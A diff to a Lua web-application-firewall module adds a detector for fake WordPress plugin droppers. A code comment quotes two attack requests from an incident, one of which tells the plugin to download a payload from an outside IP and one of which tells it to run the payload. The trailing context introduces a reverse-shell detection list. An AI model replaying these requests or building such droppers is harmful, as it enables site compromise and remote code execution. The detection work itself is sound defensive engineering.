@@ -6117,6 +6117,59 @@ function _M.detect_webshell_path(uri)
   return nil
 end
 
+-- detect_plugin_dropper_cmd: the command call of a fake-plugin dropper, made
+-- straight to the plugin's own PHP file once the upload has landed (vol2.gr on
+-- titan, 2026-11-04, from the IP that had just logged in with a stolen
+-- password and uploaded the plugin):
+--   GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=download&url=http://151.245.195.51/bog
+--   GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=run
+-- Not one request to a PHP file under plugins/ or mu-plugins/ carried a
+-- `task` field in the October / November domlogs of seven nodes outside that
+-- attack, so the field on that path is the marker: `task=download` with a
+-- `url` field holding a URL ("DOWNLOAD"), or `task=run` ("RUN"). Fields are
+-- read as PHP registers them ($_GET, and $_POST for a form body: a backdoor
+-- reads $_REQUEST as often as $_GET), every value tested, case and blanks
+-- ignored (the safe side). PATH_INFO after the .php still runs that file.
+-- A form body padded past waf_body_max_len is not read whole, and one read
+-- in the body burn-in is logged, not enforced, so only the query is certain
+-- (docs/waf.md, rule 440 "Not covered").
+do
+  local DROPPER_FIELDS = { task = true, url = true }
+  -- The script PHP runs must be the file under the plugin directory: a .php
+  -- before that segment (`/index.php/wp-content/plugins/…`) is a front
+  -- controller with PATH_INFO, not a plugin file.
+  local function plugin_php_path(uri)
+    local p = lower(uri or "")
+    local a = p:find("/wp-content/plugins/", 1, true)
+    local b = p:find("/wp-content/mu-plugins/", 1, true)
+    local s = (a and b) and math.min(a, b) or a or b
+    if not s then return false end
+    if p:sub(1, s):find("%.php") then return false end
+    local rest = p:sub(s)
+    return rest:find("%.php$") ~= nil or rest:find("%.php/") ~= nil
+  end
+  local function norm(v) return lower((tostring(v or ""):gsub("^%s+", ""):gsub("%s+$", ""))) end
+  function _M.detect_plugin_dropper_cmd(uri, method, args, body, headers)
+    if not plugin_php_path(uri) then return nil end
+    if (args == nil or args == "") and (body == nil or body == "") then return nil end
+    local f = _M.php_request_fields(lower(method or "get"), args or "", body or "", headers or {}, DROPPER_FIELDS)
+    local tasks = f.task
+    if not tasks then return nil end
+    local has_url = false
+    for _, u in ipairs(f.url or {}) do
+      if norm(u):find("^[a-z][a-z0-9+.-]*://") then has_url = true; break end
+    end
+    local run = false
+    for _, t in ipairs(tasks) do
+      t = norm(t)
+      if t == "download" and has_url then return "DOWNLOAD" end
+      if t == "run" then run = true end
+    end
+    if run then return "RUN" end
+    return nil
+  end
+end
+
 -- REVERSE_SHELL_PATTERNS — literal substrings of well-known reverse-shell
 -- one-liners. Each entry is { needle, tag }. The needles are intentionally
 -- specific (multi-token) so they don't match prose like "import socket"
